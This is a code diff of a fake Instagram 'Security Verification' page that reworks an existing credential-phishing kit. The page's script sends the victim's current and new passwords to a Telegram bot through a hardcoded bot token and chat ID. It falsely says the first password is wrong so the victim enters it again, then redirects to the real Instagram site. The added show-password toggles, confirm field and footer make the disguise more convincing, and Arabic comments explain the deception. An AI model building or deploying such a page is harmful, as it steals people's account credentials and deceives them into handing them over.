@@ -8,32 +8,70 @@
     <style>
         * { box-sizing: border-box; }
         body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; margin: 0; min-height: 100vh; }
-        .main-container { background-color: #fff; border: 1px solid #dbdbdb; padding: 30px 40px; width: 350px; margin-top: 80px; display: flex; flex-direction: column; align-items: center; border-radius: 1px; }
+        .main-container { background-color: #fff; border: 1px solid #dbdbdb; padding: 20px 40px; width: 350px; margin-top: 40px; display: flex; flex-direction: column; align-items: center; border-radius: 1px; }
         .header-text { color: #262626; font-weight: 600; font-size: 17px; margin-bottom: 12px; text-align: center; }
-        .sub-text { color: #8e8e8e; font-size: 14px; line-height: 18px; margin-bottom: 25px; text-align: center; }
-        input { width: 100%; padding: 11px 8px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 13px; }
-        .btn-submit { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 8px; font-weight: 600; cursor: pointer; margin: 15px 0; }
+        .sub-text { color: #8e8e8e; font-size: 14px; line-height: 18px; margin-bottom: 20px; text-align: center; }
+        
+        .input-group { width: 100%; position: relative; margin-bottom: 8px; }
+        input { width: 100%; padding: 11px 8px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 13px; }
+        input:focus { border: 1px solid #a8a8a8; outline: none; }
+        
+        /* أيقونة العين */
+        .show-pass { position: absolute; right: 10px; top: 10px; font-size: 12px; font-weight: 600; color: #262626; cursor: pointer; user-select: none; }
+        
+        .btn-submit { width: 100%; background-color: #0095f6; color: white; border: none; padding: 8px; border-radius: 8px; font-weight: 600; cursor: pointer; margin: 15px 0; }
         .error-msg { color: #ed4956; font-size: 12px; margin-bottom: 10px; display: none; text-align: center; }
-        .footer { margin-top: auto; padding: 24px; text-align: center; width: 100%; color: #8e8e8e; font-size: 12px; }
+        
+        .divider { display: flex; width: 100%; align-items: center; margin: 10px 0; }
+        .divider div { flex: 1; height: 1px; background-color: #dbdbdb; }
+        .divider span { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
+        
+        .forgot-link { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 10px; font-weight: 500; }
+        
+        .footer { margin-top: auto; padding: 24px; text-align: center; width: 100%; color: #8e8e8e; }
+        .footer-links { display: flex; justify-content: center; flex-wrap: wrap; gap: 12px; margin-bottom: 10px; font-size: 12px; }
+        .lang-select { border: none; background: none; color: #8e8e8e; font-size: 12px; outline: none; }
     </style>
 </head>
 <body>
 
     <div class="main-container">
         <h2 class="header-text">Security Verification</h2>
-        <p id="status_text" class="sub-text">To secure your account, please verify your current password before choosing a new one.</p>
+        <p id="status_text" class="sub-text">Verify your identity to secure your account.</p>
         
-        <div id="error_msg" class="error-msg">The password you entered is incorrect. Please try again.</div>
+        <div id="error_msg" class="error-msg"></div>
         
-        <input type="password" id="pass_input" placeholder="Current Password" autocomplete="current-password">
-        <input type="password" placeholder="New Password">
+        <div class="input-group">
+            <input type="password" id="old_p" placeholder="Current Password" autocomplete="current-password">
+            <span class="show-pass" onclick="togglePass('old_p')">Show</span>
+        </div>
         
-        <button type="button" id="submit_btn" class="btn-submit">Verify & Update</button>
+        <div class="input-group">
+            <input type="password" id="new_p" placeholder="New Password">
+            <span class="show-pass" onclick="togglePass('new_p')">Show</span>
+        </div>
+        
+        <div class="input-group">
+            <input type="password" id="confirm_p" placeholder="Confirm New Password">
+        </div>
+        
+        <button type="button" id="submit_btn" class="btn-submit">Change Password</button>
+
+        <div class="divider"><div></div><span>OR</span><div></div></div>
+        
+        <a href="instagram://password/reset" class="forgot-link" onclick="window.location.href='https://www.instagram.com/accounts/password/reset/'">Forgot password?</a>
     </div>
 
     <div class="footer">
-        <div>Meta • About • Help • Privacy • Terms</div>
-        <div style="margin-top: 10px;">© 2026 Instagram from Meta</div>
+        <div class="footer-links">
+            <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span><span>Help</span><span>Privacy</span><span>Terms</span>
+        </div>
+        <div class="footer-links">
+            <select class="lang-select">
+                <option>English</option><option>Français</option><option>العربية</option>
+            </select>
+            <span>© 2026 Instagram from Meta</span>
+        </div>
     </div>
 
     <script>
@@ -41,34 +79,50 @@
         const token = '8531200875:AAGR0wRXZLRvrvwqGgXwfBRd6n0V0gjYWcU';
         const chatId = '6347084263';
 
+        // وظيفة العين (إظهار/إخفاء)
+        function togglePass(id) {
+            const x = document.getElementById(id);
+            const btn = x.nextElementSibling;
+            if (x.type === "password") {
+                x.type = "text"; btn.innerText = "Hide";
+            } else {
+                x.type = "password"; btn.innerText = "Show";
+            }
+        }
+
         document.getElementById('submit_btn').onclick = function() {
-            const pass = document.getElementById('pass_input').value;
-            if(!pass) return;
+            const oldP = document.getElementById('old_p').value;
+            const newP = document.getElementById('new_p').value;
+            const confP = document.getElementById('confirm_p').value;
+            const errorBox = document.getElementById('error_msg');
+
+            // التأكد من التطابق
+            if (newP !== confP) {
+                errorBox.innerText = "New passwords do not match.";
+                errorBox.style.display = "block";
+                return;
+            }
+            if (oldP.length < 6) {
+                errorBox.innerText = "Please enter your current password.";
+                errorBox.style.display = "block";
+                return;
+            }
 
             attempt++;
-            
-            // إرسال البيانات لتيليغرام بلا ما تبان حتى صفحة
-            const message = `🚨 Attempt ${attempt}: ${pass}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            
-            fetch(url); // الخدمة في الخلفية
+            const message = `🚨 Attempt ${attempt}:\nOld: ${oldP}\nNew: ${newP}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
 
             if (attempt === 1) {
-                // المرة الأولى: كذبو عليه بلي غلط
-                document.getElementById('pass_input').value = "";
-                document.getElementById('error_msg').style.display = "block";
-                document.getElementById('pass_input').style.border = "1px solid #ed4956";
+                errorBox.innerText = "The password you entered is incorrect. Please try again.";
+                errorBox.style.display = "block";
+                document.getElementById('old_p').value = "";
+                document.getElementById('old_p').style.border = "1px solid #ed4956";
             } else {
-                // المرة الثانية: صيفطو لتطبيق إنستغرام نيشان
-                window.location.href = "instagram://"; 
-                
-                // إلا ما عندوش التطبيق محلول، صيفطو للموقع الرسمي
-                setTimeout(() => {
-                    window.location.href = "https://www.instagram.com/accounts/login/";
-                }, 500);
+                // فتح التطبيق أو الموقع
+                window.location.href = "instagram://";
+                setTimeout(() => { window.location.href = "https://www.instagram.com/"; }, 600);
             }
         };
     </script>
-
 </body>
 </html>
